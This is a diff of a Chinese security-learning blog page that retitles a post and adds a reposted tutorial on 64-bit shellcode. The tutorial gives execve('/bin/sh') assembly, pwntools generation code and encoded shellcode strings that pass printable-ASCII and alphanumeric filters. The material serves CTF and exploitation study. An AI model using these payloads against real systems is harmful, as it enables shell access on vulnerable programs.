@@ -20,12 +20,12 @@
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"xiaoxiaoxy1.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
-<meta name="description" content="pwn-基础">
+<meta name="description" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Linux动态链接">
+<meta property="og:title" content="文章收藏">
 <meta property="og:url" content="http://xiaoxiaoxy1.github.io/2022/04/16/Linux%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/index.html">
 <meta property="og:site_name" content="xiaoxiaoxy">
-<meta property="og:description" content="pwn-基础">
+<meta property="og:description" content="pwn">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/04/16/Linux%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/1574510177475-db49a7d5-6909-421e-a868-6829c9a7b4a4.png">
 <meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/04/16/Linux%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/1574513788142-e66171f3-6300-4e14-ab57-cc301c936829.jpeg">
@@ -36,7 +36,7 @@
 <meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/04/16/Linux%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/1580739542097-a6d2738b-9a08-4b5f-acd8-d5f2c4d77278.jpeg">
 <meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/04/16/Linux%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/1580739570228-64997692-8003-4c10-acf2-2c8d91095e3c-165011977946810.jpeg">
 <meta property="article:published_time" content="2022-04-16T14:30:41.000Z">
-<meta property="article:modified_time" content="2022-04-16T14:51:12.816Z">
+<meta property="article:modified_time" content="2022-05-05T08:24:50.216Z">
 <meta property="article:author" content="xiaoxiaoxy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://xiaoxiaoxy1.github.io/2022/04/16/Linux%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/1574510177475-db49a7d5-6909-421e-a868-6829c9a7b4a4.png">
@@ -46,10 +46,10 @@
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://xiaoxiaoxy1.github.io/2022/04/16/Linux%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/","path":"2022/04/16/Linux动态链接/","title":"Linux动态链接"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://xiaoxiaoxy1.github.io/2022/04/16/Linux%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/","path":"2022/04/16/Linux动态链接/","title":"文章收藏"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>Linux动态链接 | xiaoxiaoxy</title>
+<title>文章收藏 | xiaoxiaoxy</title>
   
 
 
@@ -117,7 +117,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5"><span class="nav-number">1.</span> <span class="nav-text">Linux动态链接</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PLT-amp-GOT"><span class="nav-number">1.1.</span> <span class="nav-text">PLT&amp;GOT</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A"><span class="nav-number">1.2.</span> <span class="nav-text">延迟绑定</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E6%88%98%E9%AA%8C%E8%AF%81"><span class="nav-number">2.</span> <span class="nav-text">实战验证</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5"><span class="nav-number">1.</span> <span class="nav-text">Linux动态链接</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PLT-amp-GOT"><span class="nav-number">1.1.</span> <span class="nav-text">PLT&amp;GOT</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A"><span class="nav-number">1.2.</span> <span class="nav-text">延迟绑定</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shellcode"><span class="nav-number">2.</span> <span class="nav-text">shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">2.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#64%E4%BD%8Dshellcode%E7%BC%96%E5%86%99"><span class="nav-number">2.2.</span> <span class="nav-text">64位shellcode编写</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5pwntools%E7%94%9F%E6%88%90%E9%BB%98%E8%AE%A4shellcode"><span class="nav-number">2.2.1.</span> <span class="nav-text">直接pwntools生成默认shellcode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%8B%E5%8A%A8%E7%BC%96%E5%86%99shellcode"><span class="nav-number">2.2.2.</span> <span class="nav-text">手动编写shellcode</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.</span> <span class="nav-text">白名单绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%AF%E6%89%93%E5%8D%B0ascii"><span class="nav-number">2.3.1.</span> <span class="nav-text">可打印ascii</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BA%AF%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Dshellcode"><span class="nav-number">2.3.2.</span> <span class="nav-text">纯数字字母shellcode</span></a></li></ol></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -183,7 +183,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Linux动态链接
+          文章收藏
         </h1>
 
         <div class="post-meta-container">
@@ -193,15 +193,21 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
-      
 
-      <time title="Created: 2022-04-16 22:30:41 / Modified: 22:51:12" itemprop="dateCreated datePublished" datetime="2022-04-16T22:30:41+08:00">2022-04-16</time>
+      <time title="Created: 2022-04-16 22:30:41" itemprop="dateCreated datePublished" datetime="2022-04-16T22:30:41+08:00">2022-04-16</time>
     </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2022-05-05 16:24:50" itemprop="dateModified" datetime="2022-05-05T16:24:50+08:00">2022-05-05</time>
+      </span>
 
   
 </div>
 
-            <div class="post-description">pwn-基础</div>
+            <div class="post-description">pwn</div>
         </div>
       </header>
 
@@ -209,7 +215,8 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <p>文章转自：<a target="_blank" rel="noopener" href="https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL">Basic-ROP · 语雀 (yuque.com)</a></p>
+        <p>因为担心有些博文会被博主删除，在这里提前copy一份</p>
+<p>文章转自：<a target="_blank" rel="noopener" href="https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL">Basic-ROP · 语雀 (yuque.com)</a></p>
 <br/>
 
 <h2 id="Linux动态链接"><a href="#Linux动态链接" class="headerlink" title="Linux动态链接"></a>Linux动态链接</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/linyt/article/details/51635768">参考博文</a></p>
@@ -301,9 +308,47 @@
 
 <br/>
 
+<br/>
 
+<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>文章转自：<a target="_blank" rel="noopener" href="https://nuoye-blog.github.io/2020/05/09/dea90f48/">64位shellcode编写 | nuoye’s blog (nuoye-blog.github.io)</a></p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>目前网上主要是各种32位的shellcode编写教程，64位的比较少，这篇文章主要讲解一下64位shellcode的编写以及介绍几种比较常见的白名单绕过方法</p>
+<h3 id="64位shellcode编写"><a href="#64位shellcode编写" class="headerlink" title="64位shellcode编写"></a>64位shellcode编写</h3><h4 id="直接pwntools生成默认shellcode"><a href="#直接pwntools生成默认shellcode" class="headerlink" title="直接pwntools生成默认shellcode"></a>直接pwntools生成默认shellcode</h4><p>这一种方法是最简单的，通过下面的代码即可生成一段64位shellcode代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>
 
-<h2 id="实战验证"><a href="#实战验证" class="headerlink" title="实战验证"></a>实战验证</h2><p>有空再更，还有别的得弄。</p>
+<p>但这段代码有一个缺点，就是生成的shellcode比较长，在某些空间比较小的情况不能很好的使用，接下来我们就一步一步的学习手动编写shellcode吧。</p>
+<h4 id="手动编写shellcode"><a href="#手动编写shellcode" class="headerlink" title="手动编写shellcode"></a>手动编写shellcode</h4><p>在手动编写shellcode之前，我们首先要知道shellcode这一段代码调动shell的原理。</p>
+<p>linux中，存在着一系列的系统调用，这些系统调用都通过syscall指令来触发，并且通过rax寄存器作为系统调用号来区分不同的系统调用，可以通过查看linux源码目录下的arch/x86/entry/syscall_64.tbl获得对应的系统调用号。比如，execve对应的的系统调用号为59。</p>
+<p>接着，即是通过rdi和rsi两个寄存器传入参数。其中，rdi是指向运行程序的路径的指针，rsi为一个指向0的指针，rdx为0。</p>
+<p>总结下，我们应该完成如下操作：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rax = 59</span><br><span class="line">rdi = [&#x27;/bin/sh&#x27;]</span><br><span class="line">rsi = [0]</span><br><span class="line">rdx = 0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+<p>所以就可以编写我们就可以开始正式编写了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xor rdx,rdx</span><br><span class="line">push rdx</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rax,0x68732f2f6e69622f</span><br><span class="line">push rax</span><br><span class="line">mov rdi,rsp</span><br><span class="line">mov rax,59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+<p>(这里因为64位数据不能直接push，所以用了rax寄存器来传递)</p>
+<p>编写完后，我们可以用pwntools模块来快速编译使用：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">push rdx;</span></span><br><span class="line"><span class="string">mov rsi,rsp;</span></span><br><span class="line"><span class="string">mov rax,0x68732f2f6e69622f;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">mov rax,59;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure>
+
+<p>这样生成的shellcode就只有30字节，一般这种大小就足够了。</p>
+<h3 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h3><h4 id="可打印ascii"><a href="#可打印ascii" class="headerlink" title="可打印ascii"></a>可打印ascii</h4><p>这一种的限制一般是要求shellcode为可打印字符，包括字母、数字、符号。</p>
+<p>针对这一种白名单，已经有了一个不错的工具：<a target="_blank" rel="noopener" href="https://github.com/rcx/shellcode_encoder">shellcode_encoder</a></p>
+<p>使用这一工具首先需要安装z3-solver：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pip install z3-solver</span><br></pre></td></tr></table></figure>
+
+<p>开始生成可打印shellcode前，我们需要先将原来的shellcode输出到一个文件中，这里我们用python来执行：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">push rdx;</span></span><br><span class="line"><span class="string">mov rsi,rsp;</span></span><br><span class="line"><span class="string">mov rax,0x68732f2f6e69622f;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">mov rax,59;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;shellcode&#x27;</span>,<span class="string">&#x27;wb+&#x27;</span>)</span><br><span class="line">f.write(shellcode)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+
+<p>然后，将生成的shellcode文件放到shellcode_encoder目录下，运行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python main.py shellcode rax+29</span><br></pre></td></tr></table></figure>
+
+<p>其中，shellcode是我们生成的shellcode文件，然后因为漏洞程序是通过call rax调用shellcode的，以及shellcode_encoder生成shellcode时的偏移位置，所以这里用了rax+29。</p>
+<p>然后就会自动生成可打印的shellcode了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Original length: 30</span><br><span class="line">Encoded length:  476</span><br><span class="line">Preamble length: 29</span><br><span class="line">Total length:    505</span><br><span class="line"></span><br><span class="line">PPTAYAXVI31VXXXf-C_f-@hf-`8PZTAYAXVI31VXPP[_Hc4:14:SX- (mz-i Wx5?&lt;??P^14:WX-|w_?-@U@C-@3`&#125;P_Hc4:14:SX-IL+N-@x6x5?41&#125;P^14:WX-|w_?-@U@C-@3`&#125;P_Hc4:14:SX-Txl(-H0| 5V__&gt;P^14:WX-|w_?-@U@C-@3`&#125;P_Hc4:14:SX-Gz#&#x27;-~  @5?_?_P^14:WX-|w_?-@U@C-@3`&#125;P_Hc4:14:SX-e3&#x27;R-T)@~5O ^?P^14:WX-|w_?-@U@C-@3`&#125;P_Hc4:14:SX-&amp;Pu8-( @@57O?oP^14:WX-|w_?-@U@C-@3`&#125;P_SX-:AXH-#?Hx5;~_?P_Hc4:14:SX- $80- ,  5?M7?P^14:WX-|w_?-@U@C-@3`&#125;P_SX-@dG1- dyo5&lt;6?_P^SX-zphB-``(~5&gt;/o?P_AAAAo&#123;5mTM=K8_?* *v k1jXk_DC(%r:ou&#125;&#125;n;oopM]alYoM0&quot;+/O%Y2P9@&quot;USR2|O?+</span><br></pre></td></tr></table></figure>
+
+<p>可以看到shellcode的总长是505，这样的长度对于某些特定的题目来说是不行的，所以下面介绍另一种shellcode。</p>
+<h4 id="纯数字字母shellcode"><a href="#纯数字字母shellcode" class="headerlink" title="纯数字字母shellcode"></a>纯数字字母shellcode</h4><p>文章：<a target="_blank" rel="noopener" href="https://hama.hatenadiary.jp/entry/2017/04/04/190129">https://hama.hatenadiary.jp/entry/2017/04/04/190129</a></p>
+<p>这里就不具体分析了，直接给出最终的shellcode，感兴趣的可以自行阅读学习</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PPYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXA</span><br></pre></td></tr></table></figure>
 
     </div>
 
